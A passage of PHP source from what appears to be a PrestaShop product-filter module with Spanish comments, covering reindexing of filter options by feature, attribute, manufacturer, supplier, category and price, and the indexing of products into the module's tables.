                    SELECT
                        fv.*
                    FROM
                        " . _DB_PREFIX_ . "feature_value AS fv,
                        " . _DB_PREFIX_ . "feature_value_lang AS fvl
                    WHERE
                        fv.id_feature_value = fvl.id_feature_value AND
                        fvl.id_lang = ".Configuration::get('PS_LANG_DEFAULT')." AND
                        fv.id_feature = " . $FilterClass->level_depth . "
                    ORDER BY fvl.value
                ");

                //{Option Criterion} creados al instalar
                $options_criterion = OptionCriterionClass::getOptionsCriterionsByLevelDepth(array($this->GLOBAL->Criterions->Feature), array($FilterClass->level_depth));

                //Obtener los {id}({id_table}) de {caracteristicas}
                $ids_features_value = array();
                //Almacenar el {id_option_criterion} en un array asociativo donde la llave es {id_table}, en este caso {id_feature_value}
                $id_feature_value_option_criterion = array();
                foreach ($options_criterion as $option_criterion) {
                    $ids_features_value[$option_criterion['id_table']] = $option_criterion['id_table'];
                    $id_feature_value_option_criterion[$option_criterion['id_table']] = $option_criterion['id_option_criterion'];
                }

                //Listado de {ids} de {option_criterion} que fueron creados, mas no actualizados
                $ids_option_criterions_add = array();

                //Crear o actualizar el {option_criterion}
                foreach ($all_features_value as $feature_value) {
                    $id_feature_value = $feature_value['id_feature_value'];

                    $FeatureValue = new FeatureValue($id_feature_value);

                    $id_option_criterion = isset($id_feature_value_option_criterion[$id_feature_value]) ? $id_feature_value_option_criterion[$id_feature_value] : NULL;

                    $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);
                    $OptionCriterionClass->value = $FeatureValue->value;
                    $OptionCriterionClass->id_table = $FeatureValue->id;
                    $OptionCriterionClass->criterion = $this->GLOBAL->Criterions->Feature;
                    $OptionCriterionClass->level_depth = $FeatureValue->id_feature;
                    
                    if (!$OptionCriterionClass->validateFieldsLang(false, true))
                        continue;
                        
                    if (is_array($OptionCriterionClass->value) && 
                        sizeof($OptionCriterionClass->value) && 
                        empty($OptionCriterionClass->value[Configuration::get('PS_LANG_DEFAULT')])
                    )
                        continue;

                    if (!$OptionCriterionClass->save())
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save option criterion.')));

                    if (is_null($id_option_criterion)) {
                        array_push($ids_option_criterions_add, $OptionCriterionClass->id);
                    }

                    if (array_key_exists($id_feature_value, $ids_features_value))
                        unset($ids_features_value[$id_feature_value]);
                }

                //Crear nuevas opciones para cada filtro
                if (!$this->fillNewOptionsForFiltersToReindex($ids_option_criterions_add, $this->GLOBAL->Criterions->Feature, $FilterClass->level_depth))
                    return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save new option.')));

                //Remover los {option_criterion} que no se encontraron
                //Remover las {option} asociadas al {option_criterion}
                foreach ($ids_features_value as $id_feature_value => $value) {
                    $id_option_criterion = $id_feature_value_option_criterion[$id_feature_value];

                    $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);

                    if (Validate::isLoadedObject($OptionCriterionClass)) {
                        if (!$OptionCriterionClass->delete())
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete option.')));

                        if (!OptionClass::deleteOptionsByIdOptionCriterion($id_option_criterion))
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete the options.')));
                    }
                }

                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('Process completed successfully.')));
            }
            elseif ($FilterClass->criterion == $this->GLOBAL->Criterions->Attribute) {
                //Listado de todas los atributos
                $all_attributes = Db::getInstance()->ExecuteS("
                    SELECT
                        a.*
                    FROM
                        " . _DB_PREFIX_ . "attribute AS a,
                        " . _DB_PREFIX_ . "attribute_lang AS al
                    WHERE
                        a.id_attribute = al.id_attribute AND
                        al.id_lang = ".Configuration::get('PS_LANG_DEFAULT')." AND
                        a.id_attribute_group = " . $FilterClass->level_depth . "
                    ORDER BY al.name
                ");

                //{Option Criterion} creados al instalar
                $options_criterion = OptionCriterionClass::getOptionsCriterionsByLevelDepth(array($this->GLOBAL->Criterions->Attribute), array($FilterClass->level_depth));

                //Obtener los {id}({id_table}) de {attributos}
                $ids_attributes = array();
                //Almacenar el {id_option_criterion} en un array asociativo donde la llave es {id_table}, en este caso {id_atrribute}
                $id_attribute_option_criterion = array();
                foreach ($options_criterion as $option_criterion) {
                    $ids_attributes[$option_criterion['id_table']] = $option_criterion['id_table'];
                    $id_attribute_option_criterion[$option_criterion['id_table']] = $option_criterion['id_option_criterion'];
                }

                //Listado de {ids} de {option_criterion} que fueron creados, mas no actualizados
                $ids_option_criterions_add = array();

                //Crear o actualizar el {option_criterion}
                foreach ($all_attributes as $attr) {
                    $id_attribute = $attr['id_attribute'];

                    $Attribute = new Attribute($id_attribute);

                    $id_option_criterion = isset($id_attribute_option_criterion[$id_attribute]) ? $id_attribute_option_criterion[$id_attribute] : NULL;

                    $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);
                    $OptionCriterionClass->value = $Attribute->name;
                    $OptionCriterionClass->id_table = $Attribute->id;
                    $OptionCriterionClass->criterion = $this->GLOBAL->Criterions->Attribute;
                    $OptionCriterionClass->level_depth = $Attribute->id_attribute_group;
                    
                    if (!$OptionCriterionClass->validateFieldsLang(false, true))
                        continue;
                    
                    if (is_array($OptionCriterionClass->value) && 
                        sizeof($OptionCriterionClass->value) && 
                        empty($OptionCriterionClass->value[Configuration::get('PS_LANG_DEFAULT')])
                    )
                        continue;

                    if (!$OptionCriterionClass->save())
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save option criterion.')));

                    if (is_null($id_option_criterion)) {
                        array_push($ids_option_criterions_add, $OptionCriterionClass->id);
                    }

                    if (array_key_exists($id_attribute, $ids_attributes))
                        unset($ids_attributes[$id_attribute]);
                }

                //Crear nuevas opciones para cada filtro
                if (!$this->fillNewOptionsForFiltersToReindex($ids_option_criterions_add, $this->GLOBAL->Criterions->Attribute, $FilterClass->level_depth))
                    return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save new option.')));

                //Remover los {option_criterion} que no se encontraron
                //Remover las {option} asociadas al {option_criterion}
                foreach ($ids_attributes as $id_attribute => $value) {
                    $id_option_criterion = $id_attribute_option_criterion[$id_attribute];

                    $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);

                    if (Validate::isLoadedObject($OptionCriterionClass)) {
                        if (!$OptionCriterionClass->delete())
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete option.')));

                        if (!OptionClass::deleteOptionsByIdOptionCriterion($id_option_criterion))
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete the options.')));
                    }
                }

                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('Process completed successfully.')));
            }
            elseif ($FilterClass->criterion == $this->GLOBAL->Criterions->Manufacturer) {
                //Listado de todas los fabricantes
                $all_manufacturers = OptionCriterionClass::getManufacturers(FALSE);

                //{Option Criterion} creados al instalar
                $options_criterion = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Manufacturer);

                //Obtener los {id}({id_table}) de {fabricantes}
                $ids_manufacturers = array();
                //Almacenar el {id_option_criterion} en un array asociativo donde la llave es {id_table}, en este caso {id_manufacturer}
                $id_manufacturer_option_criterion = array();
                foreach ($options_criterion as $option_criterion) {
                    $ids_manufacturers[$option_criterion['id_table']] = $option_criterion['id_table'];
                    $id_manufacturer_option_criterion[$option_criterion['id_table']] = $option_criterion['id_option_criterion'];
                }

                //Listado de {ids} de {option_criterion} que fueron creados, mas no actualizados
                $ids_option_criterions_add = array();
                //Listado de {fabricantes} agrupadas por {id_option_criterion}
                $manufacturers_by_option_criterion = array();

                //Crear o actualizar el {option_criterion}
                foreach ($all_manufacturers as $_manufacturer) {
                    $id_manufacturer = $_manufacturer['id_manufacturer'];
                    //Load de {manufacturer} para llenar el campo {value}
                    $Manufacturer = new Manufacturer($id_manufacturer);

                    $id_option_criterion = isset($id_manufacturer_option_criterion[$id_manufacturer]) ? $id_manufacturer_option_criterion[$id_manufacturer] : NULL;

                    $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);
                    $OptionCriterionClass->value = $this->getEmptyValuesLang($Manufacturer->name);
                    $OptionCriterionClass->id_table = $Manufacturer->id;
                    $OptionCriterionClass->criterion = $this->GLOBAL->Criterions->Manufacturer;
                    
                    //Obtener las opciones que estan asociadas con el {option_criterion} para actualizar el campo {active}
                    if (!is_null($id_option_criterion)) {
                        $options = OptionClass::getOptionsByIdOptionCriterion($id_option_criterion);

                        foreach ($options as $option) {
                            $OptionClass = new OptionClass($option['id_option']);

                            if (Validate::isLoadedObject($OptionClass)) {
                                if(version_compare(_PS_VERSION_, '1.4') > 0)
                                    if ($OptionClass->active && !$Manufacturer->active) {
                                        $OptionClass->active = FALSE;
    
                                        if (!$OptionClass->update())
                                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update option.')));
                                    }
                            }
                            else
                                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update option.')));
                        }
                    }

                    if (!$OptionCriterionClass->save())
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save option criterion.')));

                    if (is_null($id_option_criterion)) {
                        array_push($ids_option_criterions_add, $OptionCriterionClass->id);
                        $manufacturers_by_option_criterion[$OptionCriterionClass->id] = array(
                            'active' => $Manufacturer->active
                        );
                    }

                    if (array_key_exists($id_manufacturer, $ids_manufacturers))
                        unset($ids_manufacturers[$id_manufacturer]);
                }

                //Crear nuevas opciones para cada filtro
                if (!$this->fillNewOptionsForFiltersToReindex($ids_option_criterions_add, $this->GLOBAL->Criterions->Manufacturer, NULL, $manufacturers_by_option_criterion))
                    return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save new option.')));

                //Remover los {option_criterion} que no se encontraron
                //Remover las {option} asociadas al {option_criterion}
                foreach ($ids_manufacturers as $id_manufacturer => $value) {
                    $id_option_criterion = $id_manufacturer_option_criterion[$id_manufacturer];

                    $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);

                    if (Validate::isLoadedObject($OptionCriterionClass)) {
                        if (!$OptionCriterionClass->delete())
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete option.')));

                        if (!OptionClass::deleteOptionsByIdOptionCriterion($id_option_criterion))
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete the options.')));
                    }
                }

                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('Process completed successfully.')));
            }
            elseif ($FilterClass->criterion == $this->GLOBAL->Criterions->Supplier) {
                //Listado de todas los proveedores
                $all_suppliers = OptionCriterionClass::getSuppliers(FALSE);

                //{Option Criterion} creados al instalar
                $options_criterion = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Supplier);

                //Obtener los {id}({id_table}) de {proveedores}
                $ids_suppliers = array();
                //Almacenar el {id_option_criterion} en un array asociativo donde la llave es {id_table}, en este caso {id_supplier}
                $id_supplier_option_criterion = array();
                foreach ($options_criterion as $option_criterion) {
                    $ids_suppliers[$option_criterion['id_table']] = $option_criterion['id_table'];
                    $id_supplier_option_criterion[$option_criterion['id_table']] = $option_criterion['id_option_criterion'];
                }

                //Listado de {ids} de {option_criterion} que fueron creados, mas no actualizados
                $ids_option_criterions_add = array();
                //Listado de {fabricantes} agrupadas por {id_option_criterion}
                $suppliers_by_option_criterion = array();

                //Crear o actualizar el {option_criterion}
                foreach ($all_suppliers as $_supplier) {
                    $id_supplier = $_supplier['id_supplier'];
                    //Load de {supplier} para llenar el campo {value}
                    $Supplier = new Supplier($id_supplier);

                    $id_option_criterion = isset($id_supplier_option_criterion[$id_supplier]) ? $id_supplier_option_criterion[$id_supplier] : NULL;

                    $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);
                    $OptionCriterionClass->value = $this->getEmptyValuesLang($Supplier->name);
                    $OptionCriterionClass->id_table = $Supplier->id;
                    $OptionCriterionClass->criterion = $this->GLOBAL->Criterions->Supplier;

                    //Obtener las opciones que estan asociadas con el {option_criterion} para actualizar el campo {active}
                    if (!is_null($id_option_criterion)) {
                        $options = OptionClass::getOptionsByIdOptionCriterion($id_option_criterion);

                        foreach ($options as $option) {
                            $OptionClass = new OptionClass($option['id_option']);

                            if (Validate::isLoadedObject($OptionClass)) {
                                if(version_compare(_PS_VERSION_, '1.4') > 0)
                                    if ($OptionClass->active && !$Supplier->active) {
                                        $OptionClass->active = FALSE;
    
                                        if (!$OptionClass->update())
                                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update option.')));
                                    }
                            }
                            else
                                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update option.')));
                        }
                    }

                    if (!$OptionCriterionClass->save())
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save option criterion.')));

                    if (is_null($id_option_criterion)) {
                        array_push($ids_option_criterions_add, $OptionCriterionClass->id);
                        $suppliers_by_option_criterion[$OptionCriterionClass->id] = array(
                            'active' => $Supplier->active
                        );
                    }

                    if (array_key_exists($id_supplier, $ids_suppliers))
                        unset($ids_suppliers[$id_supplier]);
                }

                //Crear nuevas opciones para cada filtro
                if (!$this->fillNewOptionsForFiltersToReindex($ids_option_criterions_add, $this->GLOBAL->Criterions->Supplier, NULL, $suppliers_by_option_criterion))
                    return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save new option.')));

                //Remover los {option_criterion} que no se encontraron
                //Remover las {option} asociadas al {option_criterion}
                foreach ($ids_suppliers as $id_supplier => $value) {
                    $id_option_criterion = $id_supplier_option_criterion[$id_supplier];

                    $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);

                    if (Validate::isLoadedObject($OptionCriterionClass)) {
                        if (!$OptionCriterionClass->delete())
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete option.')));

                        if (!OptionClass::deleteOptionsByIdOptionCriterion($id_option_criterion))
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete the options.')));
                    }
                }

                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('Process completed successfully.')));
            }
            else {
                //Retornar {Exito}
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('Process completed successfully.')));
            }
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying reindex data.')));
    }

    private function fillNewOptionsForFiltersToReindex($ids_option_criterions_add, $criterion, $level_depth = NULL, $data = array()) {
        $filters = FilterClass::getFiltersByCriterion($this->id_lang, $criterion, $level_depth);
        
        //Crear nuevas opciones para cada filtro
        foreach ($filters as $filter) {
            $id_filter = $filter['id_filter'];

            foreach ($ids_option_criterions_add as $id_option_criterion) {
                $OptionClass = new OptionClass();

                $OptionClass->id_filter = $id_filter;
                $OptionClass->id_option_criterion = $id_option_criterion;
                $OptionClass->position = 0;
                $OptionClass->active = isset($data[$id_option_criterion]['active']) ? $data[$id_option_criterion]['active'] : TRUE;

                if (!$OptionClass->add())
                    return FALSE;
            }
        }

        return TRUE;
    }
    
    public static function recurseCategory($id_category, $id_lang) {
        $category = new Category($id_category);
        $sub_categories = $category->getSubCategories($id_lang);
        self::$list_categories[] = $id_category;
        foreach($sub_categories as $category){
            self::recurseCategory($category['id_category'], $id_lang);
        }
    }

    private function indexProductsForCategory($id_filter) {
        $options_criterion = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Category);
                
        $FilterClass = new FilterClass($id_filter);
        if(!Validate::isLoadedObject($FilterClass))
            return FALSE;

        foreach ($options_criterion as $option_criterion) {
            $options = OptionClass::getOptionsByIdOptionCriterionAndFilter($option_criterion['id_option_criterion'], $FilterClass->id);
            
            if(!sizeof($options))
                continue;
            
            if($FilterClass->level_depth){
                self::$list_categories = array();
                self::recurseCategory((int)$option_criterion['id_table'], $this->id_lang);
            }
            
            $sqlCategory = $FilterClass->level_depth ? "IN (" . implode(',', self::$list_categories) . ")" : "= " . (int) $option_criterion['id_table'];
                        
            $products = Db::getInstance()->ExecuteS("
                SELECT 
                    DISTINCT(cp.id_product)
                FROM 
                    " . _DB_PREFIX_ . "category_product AS cp,
                    " . _DB_PREFIX_ . "product AS p
                WHERE 
                    cp.id_product = p.id_product AND
                    p.active = 1 AND
                    cp.id_category " . $sqlCategory . "
                
            ");

            if (!$this->fillIndexProduct($options, $products))
                return FALSE;
        }

        return TRUE;
    }

    private function indexProductsForFeature($id_filter) {
        $options_criterion = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Feature);

        foreach ($options_criterion as $option_criterion) {
            $options = OptionClass::getOptionsByIdOptionCriterionAndFilter($option_criterion['id_option_criterion'], $id_filter);

            $products = Db::getInstance()->ExecuteS("
                SELECT fp.*
                FROM 
                    " . _DB_PREFIX_ . "feature_product AS fp,
                    " . _DB_PREFIX_ . "product AS p
                WHERE 
                    fp.id_product = p.id_product AND
                    p.active = 1 AND
                    fp.id_feature_value = " . (int) $option_criterion['id_table'] . "
            ");

            if (!$this->fillIndexProduct($options, $products))
                return FALSE;
        }

        return TRUE;
    }

    private function indexProductsForAttribute($id_filter) {
        $options_criterion = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Attribute);

        foreach ($options_criterion as $option_criterion) {
            $options = OptionClass::getOptionsByIdOptionCriterionAndFilter($option_criterion['id_option_criterion'], $id_filter);

            $products = Db::getInstance()->ExecuteS("
                SELECT DISTINCT
                    (pa.id_product)
                FROM 
                    " . _DB_PREFIX_ . "product_attribute AS pa,
                    " . _DB_PREFIX_ . "product_attribute_combination AS pac,
                    " . _DB_PREFIX_ . "product AS p
                WHERE
                    pa.id_product = p.id_product AND
                    p.active = 1 AND
                    pac.id_product_attribute = pa.id_product_attribute
                    AND pac.id_attribute = " . (int) $option_criterion['id_table'] . "
            ");

            if (!$this->fillIndexProduct($options, $products))
                return FALSE;
        }

        return TRUE;
    }

    private function indexProductsForManufacturer($id_filter) {
        $options_criterion = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Manufacturer);

        foreach ($options_criterion as $option_criterion) {
            $options = OptionClass::getOptionsByIdOptionCriterionAndFilter($option_criterion['id_option_criterion'], $id_filter);

            $products = Db::getInstance()->ExecuteS("
                SELECT DISTINCT
                    (id_product)
                FROM 
                    " . _DB_PREFIX_ . "product
                WHERE
                    active = 1 AND
                    id_manufacturer = " . (int) $option_criterion['id_table'] . "
            ");

            if (!$this->fillIndexProduct($options, $products))
                return FALSE;
        }

        return TRUE;
    }

    private function indexProductsForSupplier($id_filter) {
        $options_criterion = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Supplier);

        foreach ($options_criterion as $option_criterion) {
            $options = OptionClass::getOptionsByIdOptionCriterionAndFilter($option_criterion['id_option_criterion'], $id_filter);

            $products = Db::getInstance()->ExecuteS("
                SELECT DISTINCT
                    (id_product)
                FROM 
                    " . _DB_PREFIX_ . "product
                WHERE
                    active = 1 AND
                    id_supplier = " . (int) $option_criterion['id_table'] . "
            ");

            if (!$this->fillIndexProduct($options, $products))
                return FALSE;
        }

        return TRUE;
    }

    private function indexProductsForPrice($id_filter) {
        $options_criterion = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Price);

        //Busca productos y trae el precio
        //------------------------------------------------------------
        $products_ = Db::getInstance()->ExecuteS('
            SELECT 
                p.*, pa.id_product_attribute
            FROM 
                ' . _DB_PREFIX_ . 'product AS p
                LEFT OUTER JOIN `'._DB_PREFIX_.'product_attribute` pa ON (p.`id_product` = pa.`id_product` AND `default_on` = 1) 
            WHERE
                p.`active` = 1
        ');
        $arr_tmp = array();
        foreach ($products_ as $product){
            if(version_compare(_PS_VERSION_, '1.5') >= 0 && Configuration::get('PS_MULTISHOP_FEATURE_ACTIVE') == 1){
                 $context = Context::getContext();
                 $context->shop->id = $product['id_shop_default'];                
            }
            
            $product['product_price_final'] = Product::getPriceStatic($product['id_product'], true, $product['id_product_attribute'], 2);

            array_push($arr_tmp, $product);
        }
        $products_ = $arr_tmp;
        //------------------------------------------------------------
        
        foreach ($options_criterion as $option_criterion) {                        
            $options = OptionClass::getOptionsByIdOptionCriterionAndFilter($option_criterion['id_option_criterion'], $id_filter);                                        
            
            foreach ($options as $option) {
                $OptionCriterionClass = new OptionCriterionClass((int)$option_criterion['id_option_criterion']);
                
                $data = explode(',', $OptionCriterionClass->value[$this->id_lang]);
                $condition = isset($data[0]) ? $data[0] : '';
                $first_value = (float) (isset($data[1]) ? $data[1] : 0);
                $second_value = (float) (isset($data[2]) ? $data[2] : 0);

                $first_value = (is_numeric($first_value) ? $first_value : 0);
                $second_value = (is_numeric($second_value) ? $second_value : 0);
                
                $products = array();
                                                         
                /*Seleccionar productos que concuerden con el rango*/
                foreach ($products_ as $product) {                    
                    switch ($condition) {
                        case $this->GLOBAL->ConditionsRangePrice->Eq:
                            if($product['product_price_final'] == $first_value)
                                array_push ($products, $product);
                            break;
                        case $this->GLOBAL->ConditionsRangePrice->Lt:
                            if($product['product_price_final'] < $first_value)
                                array_push ($products, $product);
                            break;
                        case $this->GLOBAL->ConditionsRangePrice->Gt:                                                    
                            if($product['product_price_final'] > $first_value)
                                array_push ($products, $product);
                            break;
                        case $this->GLOBAL->ConditionsRangePrice->Bt:
                            if($product['product_price_final'] >= $first_value && $product['product_price_final'] <= $second_value)
                                array_push ($products, $product);
                            break;
                    }
                }       
 
                $this->fillIndexProduct(array($option), $products);
            }
        }

        return TRUE;
    }

    private function fillIndexProduct($options, $products) {
        if (is_array($options) && is_array($products)) {
            foreach ($options as $option) {
                $id_option = (int) $option['id_option'];

                if (!Db::getInstance()->Execute("
                    DELETE FROM " . _DB_PREFIX_ . "fpp_index_product WHERE id_option = " . $id_option . "
                "))
                    return FALSE;

                foreach ($products as $product) {
                    $id_product = (int) $product['id_product'];
                    
                    $filter = new FilterClass((int)$option['id_filter']);
                    
                    if (Validate::isLoadedObject($filter)){
                        $row = array(
                            'id_option' => $id_option,
                            'id_product' => $id_product,
                            'id_filter' => $option['id_filter'],
                            'id_searcher' => $filter->id_searcher
                        );
    
                        if (!Db::getInstance()->AutoExecute(_DB_PREFIX_ . 'fpp_index_product', $row, 'INSERT'))
                            return FALSE;
                    }                    
                }
            }
        }
        else
            return FALSE;

        return TRUE;
    }

    /*
     * Funciones para Herramientas
     */

    public function reindexCategories() {
        //Categorias que deben eliminarse del indexado y sus dependencias
        $categories_to_delete = Db::getInstance()->ExecuteS("
            SELECT 
                *
            FROM 
                " . _DB_PREFIX_ . "fpp_option_criterion
            WHERE
                id_table NOT IN(SELECT id_category FROM " . _DB_PREFIX_ . "category)
                AND criterion = '" . $this->GLOBAL->Criterions->Category . "'            
        ");
        
        //Categorias que se deben indexar ya que son creadas luego de instalar el modulo
        $categories_to_index = Db::getInstance()->ExecuteS("
            SELECT
                *
            FROM
                " . _DB_PREFIX_ . "category
            WHERE
                active = 1 AND 
                id_category NOT IN(SELECT id_table FROM  " . _DB_PREFIX_ . "fpp_option_criterion WHERE criterion = '" . $this->GLOBAL->Criterions->Category . "') 
        ");
        
        //Eliminar categorias
        foreach ($categories_to_delete as $row) {
            $id_category = (int)$row['id_table'];//{id_table} representa el {id_category} en la tabla {fpp_option_criterion}
            $id_option_criterion = (int)$row['id_option_criterion'];
            
            if(!empty($id_category) && !empty($id_option_criterion)){
                if(!OptionClass::deleteOptionsByIdOptionCriterion($id_option_criterion))
                    return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete the options.')));
                
                if(!Db::getInstance()->Execute("
                    DELETE FROM " . _DB_PREFIX_ . "fpp_filter_category
                    WHERE
                        id_category = " . $id_category ."
                "))
                    return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete the categories by filter.')));
                
                $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);
                if(!$OptionCriterionClass->delete())
                    return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete option criterion.')));
            }
        }
        
        //Insertar categorias
        foreach ($categories_to_index as $row) {
            $category = new Category((int)$row['id_category']);
            
            if(!Validate::isLoadedObject($category))
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying load category.')));
            
            $OptionCriterionClass = new OptionCriterionClass();
            $OptionCriterionClass->criterion = $this->GLOBAL->Criterions->Category;
            $OptionCriterionClass->level_depth = $category->level_depth;
            $OptionCriterionClass->id_table = $category->id;
            $OptionCriterionClass->value = $category->name;

            if (!$OptionCriterionClass->validateFieldsLang(false, true))
                continue;
                
            if (is_array($OptionCriterionClass->value) && 
                sizeof($OptionCriterionClass->value) && 
                empty($OptionCriterionClass->value[Configuration::get('PS_LANG_DEFAULT')])
            )
                continue;                        
            
            if(!$OptionCriterionClass->add())
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save option criterion.')));
        }
        
        //Actualizar valor con el nombre de la categoria
        $categories_indexed = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Category);
        
        foreach ($categories_indexed as $row) {
            $id_category = (int)$row['id_table'];//{id_table} representa el {id_category} en la tabla {fpp_option_criterion}
            $id_option_criterion = (int)$row['id_option_criterion'];
            
            $category = new Category($id_category);
            $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);
            
             if(!Validate::isLoadedObject($category) || !Validate::isLoadedObject($OptionCriterionClass))
                 return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying load objects.')));
            
            $OptionCriterionClass->value = $category->name;
            
            if (!$OptionCriterionClass->validateFieldsLang(false, true))
                continue;
                
            if (is_array($OptionCriterionClass->value) && 
                sizeof($OptionCriterionClass->value) && 
                empty($OptionCriterionClass->value[Configuration::get('PS_LANG_DEFAULT')])
            )
                continue;
            
            if(!$OptionCriterionClass->update())
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update option criterion.')));
        }
        
        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The indexing ended successfully')));
    }

    public function removeProductsOutStock($products) {
        if (Configuration::get('FPP_ONLY_PRODUCTS_STOCK') == 0)
            return $products;
                
        foreach ($products as $key => $product) {
            if ($product['quantity'] == 0)
                unset ($products[$key]);
        }
        
        return $products;
        
    }
    
    public function reindexProducts() {
        $filters = FilterClass::getFilters($this->id_lang);
        $errors = array();

        foreach ($filters as $filter) {
            $id_filter = (int) $filter['id_filter'];
            $name = $filter['name'];
            
            switch ($filter['criterion']) {
                case $this->GLOBAL->Criterions->Category:
                    if (!$this->indexProductsForCategory($id_filter))
                        $errors[] = $this->l('An error occurred while trying to index categories for the filter: ') . $name;
                    break;
                case $this->GLOBAL->Criterions->Attribute:
                    if (!$this->indexProductsForAttribute($id_filter))
                        $errors[] = $this->l('An error occurred while trying to index attributes for the filter: ') . $name;
                    break;
                case $this->GLOBAL->Criterions->Feature:
                    if (!$this->indexProductsForFeature($id_filter))
                        $errors[] = $this->l('An error occurred while trying to index features for the filter: ') . $name;
                    break;
                case $this->GLOBAL->Criterions->Manufacturer:
                    if (!$this->indexProductsForManufacturer($id_filter))
                        $errors[] = $this->l('An error occurred while trying to index manufacturers for the filter: ') . $name;
                    break;                
                case $this->GLOBAL->Criterions->Supplier:
                    if (!$this->indexProductsForSupplier($id_filter))
                        $errors[] = $this->l('An error occurred while trying to index suppliers for the filter: ') . $name;
                    break;
                case $this->GLOBAL->Criterions->Price:
                    if (!$this->indexProductsForPrice($id_filter))
                        $errors[] = $this->l('An error occurred while trying to index price for the filter: ') . $name;
                    break;
            }                
        }

        if (!sizeof($errors))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The indexing ended successfully')));
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'errors' => $errors));
    }
    
    public function saveConfiguration($show_button_back_filters = 0, $show_button_expand_options = 0, $show_only_products_stock = 0, $id_content_results = '#center_column'){
        if(
            Configuration::updateValue('FPP_DISPLAY_BACK_BUTTON_FILTERS', $show_button_back_filters) &&
